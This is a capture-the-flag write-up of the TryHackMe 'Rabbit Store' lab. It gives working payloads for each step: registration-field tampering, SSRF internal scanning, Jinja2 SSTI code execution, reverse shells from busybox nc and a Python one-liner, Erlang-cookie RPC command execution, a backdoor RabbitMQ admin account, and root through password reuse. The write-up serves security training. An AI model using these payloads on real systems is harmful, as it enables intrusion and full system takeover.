# Rabbit Store - TryHackMe Writeup


**Difficulty:** Medium  
**TL;DR:** JWT bypass → SSRF → SSTI RCE → RabbitMQ Erlang cookie exploit → Privilege escalation via password reuse
-----------------------------------

## Target
- Machine: `cloudsite.thm`
- Date: 2025-10-7
- Environment: TryHackMe / CTF
----------------------------------

## Steps:

### 1. Initial Reconnaissance:

```bash
nmap -sT -T4 -Pn  cloudsite.thm

22/tcp    open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http    Apache httpd 2.4.52
4369/tcp  open  epmd    Erlang Port Mapper Daemon
25672/tcp open  unknown
```
The `Login/Sing Up` page redirects to `storage.cloudsite.thm` , which required adding to the `/etc/hosts` file.


### 2. Initial Access:


#### Account Registration & Authentication Bypass

After navigating to the Rabbit Store application, I created a new account.
However, upon attempting to login, I encountered an error message:

![inactive](images/inactive.png)

#### JWT Token Analysis

Examining the application's authentication mechanism revealed the use of JSON Web Tokens (JWT). Using browser developer tools, I inspected the stored cookie:

![Coockie](images/coockie.png)

The JWT token was decoded using [jwt.io](https://www.jwt.io/) :

![jwt](images/jwt.png)

The critical finding was the `subscription` field set to `inactive`, which explained the access restriction.

#### Bypassing the Restriction

Initial attempts to directly modify the JWT token and change the `subscription` value to `active` failed due to server-side signature verification.


Using Burp Suite, I intercepted the registration request and modified the POST payload to include a `subscription` parameter set to `active`:

Modified Registration Request:
```json
{
  "email": "test1@test.thm",
  "password": "test123",
  "subscription": "active"
}
```
![Burp](images/burp.png)

This approach successfully created an account with an active subscription, allowing full access to the application's features.

#### File Upload & Service Discovery

After successful login, I found upload feature that allowed uploading files either from the local system or via URL:

![upload](images/path.png)
the path `/api/uploads/`

The upload endpoint was identified as `/api/uploads/`, which presented potential SSRF (Server-Side Request Forgery) attack vectors

#### Directory Fuzzing

To discover additional endpoints and functionality, I performed directory enumeration:
```bash
gobuster dir -u http://storage.cloudsite.thm/api/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 40 -x .php


/login                (Status: 405) [Size: 36]
/register             (Status: 405) [Size: 36]
/docs                 (Status: 403) [Size: 27]
/uploads              (Status: 401) [Size: 32]
```

#### Accessing Restricted Endpoints

Attempting to directly access `/api/docs` resulted in an "Access denied" message.

I attempted to use the URL upload functionality to fetch the `/api/docs` endpoint internally:
```txt
http://storage.cloudsite.thm/api/docs
```

![accdi](images/accdi.png)

However, this also resulted in an access denied error, indicating that the internal service on port 80 had the same access controls.

### 3. Internal Service Discovery

#### Port Scanning via SSRF

Using the file upload functionality that accepts URLs, I performed internal port scanning
to discover services running on localhost:

internal port scanning revealed a service running on port 3000:
```bash
curl -X POST http://storage.cloudsite.thm/api/store-url -H "Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InRlc3QxQHRlc3QudGhtIiwic3Vic2NyaXB0aW9uIjoiYWN0aXZlIiwiaWF0IjoxNzYyMTUyOTgxLCJleHAiOjE3NjIxNTY1ODF9.yWzMMvheKAEL3A9-1TMJ-WQR99yNPHzhTNfHF6h9h3A" -H "Content-Type: application/json" -d '{"url":"http://127.0.0.1:3000/api/docs"}'
```

![testman](images/testman.png)

![testman2](images/testman2.png)

The response indicated successful connection and revealed a new endpoint:
```txt
api/fetch_messeges_from_chatbot - Currently, the chatbot is under development. Once development is complete, it will be used in the future.
```
(3000 for Node.js 'X-Powered-By: Express')

Initial attempts to access the `/api/fetch_messeges_from_chatbot` endpoint via GET requests returned "Method Not Allowed". Further investigation through Burp Suite revealed that the endpoint only accepted POST requests.

![burp2](images/burp2.png)

The endpoint required a `username` parameter, indicating potential for user input processing.

add `username` parameter:

![burp3](images/burp3.png)

This successful interaction demonstrated the endpoint processed user input, paving the way for Server-Side Template Injection testing.

### 4. SSTI

testing SSTI:

![burp4](images/burp4.png)

A polyglot payload was deployed to detect template engine presence and trigger diagnostic errors:
```txt
${{<%[%'}}%\\
```
![burp5](images/burp5.png)
The server response revealed detailed error information.

Analysis of the error stack trace identified the application was using the Jinja2 templating engine, with key indicators including:

-   Jinja2-specific exception handling

-    Template syntax error messages

-    Framework-related file paths in the stack trace


#### SSTI to RCE
With SSTI vulnerability confirmed in the Jinja2 template engine, the next step was to achieve remote code execution and establish a reverse shell connection.

The following Jinja2 template injection payload was crafted to execute commands:
```python
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```
`request.application.__globals__`: Accesses the Flask application's global namespace

![burpid](images/burpid.png)
Command executed successfully.

#### Reverse Shell :

1. Listener Configuration:
```bash
nc -lnvp 4444
```

2. Reverse Shell Payload:
```python
{{request.application.__globals__.__builtins__.__import__('os').popen('busybox nc YOUR_IP 4444 -e bash').read()}}
```

3. Shell Stabilization:
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
```
![reverse](images/rev.png)

#### User Flag

```bash
cat /home/azrael/user.txt 
[REDACTED]
```

### 5. Privilege Escalation

#### RabbitMQ Enumeration
During post-exploitation enumeration, RabbitMQ services were discovered running on the target system:

```bash
cat /etc/hosts

127.0.0.1 localhost
127.0.1.1 forge
127.0.0.1 cloudsite.thm		storage.cloudsite.thm
```

User enumeration revealed the RabbitMQ service account:
```bash
cat /etc/passwd

rabbitmq:x:124:131:RabbitMQ messaging server,,,:/var/lib/rabbitmq:/usr/sbin/nologin
```

#### Erlang Cookie Exploitation
The Erlang distribution cookie was located, which serves as a shared secret for node authentication:

```bash
find / -name ".erlang.cookie" 2>/dev/null


cat /var/lib/rabbitmq/.erlang.cookie
#5hhRnFVBjQMDhoE5
```

Understanding the Vulnerability:
Erlang nodes authenticate with each other using this shared secret cookie. If you know the cookie, you can connect to the RabbitMQ node and execute arbitrary Erlang code, which runs with the privileges of the RabbitMQ process (often root or the `rabbitmq` user, which can be leveraged to root).


#### Establishing Connection to RabbitMQ Node
Using the discovered cookie, connection was established to the RabbitMQ node:

```bash
# Set the cookie value for our Erlang node
export ERL_EPMD_ADDRESS=127.0.0.1

erl -setcookie "5hhRnFVBjQMDhoE5" -name hacker@127.0.0.1
```

#### Python-based Exploitation
A Python script was created to automate the connection and command execution:

```bash
cat > /tmp/exploit2.erl << 'EOF'
> -module(exploit2).
> -export([connect/0]).
> 
> connect() ->
>     net_kernel:start([hacker, shortnames]),
>     erlang:set_cookie(node(), '5hhRnFVBjQMDhoE5'),
>     case net_kernel:connect_node('rabbit@forge') of
>         true -> 
>             io:format("Connected!~n"),
>             Result = rpc:call('rabbit@forge', os, cmd, ["id"]),
>             io:format("ID Result: ~p~n", [Result]),
>             
>             Whoami = rpc:call('rabbit@forge', os, cmd, ["whoami"]),
>             io:format("Whoami: ~p~n", [Whoami]),
>             
>             RootCheck = rpc:call('rabbit@forge', os, cmd, ["cat /root/root.txt"]),
>             io:format("Root Flag: ~p~n", [RootCheck]);
>         false ->
>             io:format("Connection failed~n")
>     end.
> EOF
```
```bash
erl -compile /tmp/exploit2.erl && erl -noshell -s exploit2 connect -s init stop


#ID Result: "uid=124(rabbitmq) gid=131(rabbitmq) groups=131(rabbitmq)\n"
Whoami: "rabbitmq\n"
Root Flag: "cat: /root/root.txt: Permission denied\n"
```

#### Reverse Shell Establishment
To gain better access, a reverse shell was established using Python:

```bash
cat > /tmp/python_shell.erl << 'EOF'
-module(python_shell).
-export([get_shell/0]).

get_shell() ->
    net_kernel:start([hacker, shortnames]),
    erlang:set_cookie(node(), '5hhRnFVBjQMDhoE5'),
    case net_kernel:connect_node('rabbit@forge') of
        true -> 
            io:format("Getting python reverse shell...~n"),
            rpc:call('rabbit@forge', os, cmd, ["python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"YOUR_IP\",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);'"]);
        false ->
            io:format("Connection failed~n")
    end.
EOF
```
Run:
```bash
erl -compile /tmp/python_shell.erl && erl -noshell -s python_shell get_shell -s init stop
```
This provided a stable shell as the rabbitmq user:

```bash
#The listener has already been prepared
nc -lnvp 8888

connect to [10.9.1.78] from (UNKNOWN) [10.10.56.233] 36008
bash: cannot set terminal process group (3920): Inappropriate ioctl for device
bash: no job control in this shell
rabbitmq@forge:~$ id
id
uid=124(rabbitmq) gid=131(rabbitmq) groups=131(rabbitmq)
```
#### RabbitMQ Admin Access

After obtaining the rabbitmq shell, user enumeration revealed permission issues:
```bash
rabbitmqctl list_users

16:41:08.150 [error] Cookie file ./.erlang.cookie must be accessible by owner only
```

The Erlang cookie file permissions were corrected:
```bash
chmod 400 /var/lib/rabbitmq/.erlang.cookie
 
rabbitmqctl list_users

#Listing users ...
user    tags
The password for the root user is the SHA-256 hashed value of the RabbitMQ root user's password. Please don't attempt to crack SHA-256.       []
root    [administrator]
```

A new administrator user was created in RabbitMQ:
```bash
rabbitmqctl add_user hacker P@ssw0rd123
rabbitmqctl set_user_tags hacker administrator
rabbitmqctl set_permissions -p / hacker ".*" ".*" ".*"
```

#### Password Hash Analysis
Listed RabbitMQ users and discovered password hashes:
```bash
rabbitmqadmin -u hacker -p P@ssw0rd123 list users


+------------------+--------------------------------+--------------------------------------------------+---------------+
|       name       |       hashing_algorithm        |                  password_hash                   |     tags      |
+------------------+--------------------------------+--------------------------------------------------+---------------+
| root             | rabbit_password_hashing_sha256 | 49e6hSldHRaiYX329x[REDACTED]XEOz9uxhSBHtGU+YBzWF | administrator |
| hacker           | rabbit_password_hashing_sha256 | nkOYRyTK1zbQYwiLym2kbJV5YcZFmibbI3CnQrNz5fv4osMK | administrator |
+------------------+--------------------------------+--------------------------------------------------+---------------+
```

#### Hash Decryption and Root Access
Decoded the RabbitMQ password hash structure using a Python script:

```bash
cat > /tmp/decode_hash.py << 'EOF'
> import hashlib
> import binascii
> 
> hash = '49e6hSldHRaiYX329x[REDACTED]XEOz9uxhSBHtGU+YBzWF'
> 
> def decode_rabbit_password_hash(password_hash):
>     password_hash = binascii.a2b_base64(password_hash)
>     decoded_hash = password_hash.hex()
>     return decoded_hash[0:8], decoded_hash[8:]
> 
> salt, actual_hash = decode_rabbit_password_hash(hash)
> print(f"Salt: {salt}")
> print(f"Hash: {actual_hash}")
> print(f"Hash length: {len(actual_hash)}")
> EOF

#Run
python3 /tmp/decode_hash.py


Salt: e3d7ba85
Hash: [REDACTED]
Hash length: 64
```

```bash
su root
Password: [REDACTED]

root@forge:/var/lib/rabbitmq# id
uid=0(root) gid=0(root) groups=0(root)

root@forge:/var/lib/rabbitmq# cat /root/root.txt 
[REDACTED]
```
![Root](images/root2.png)
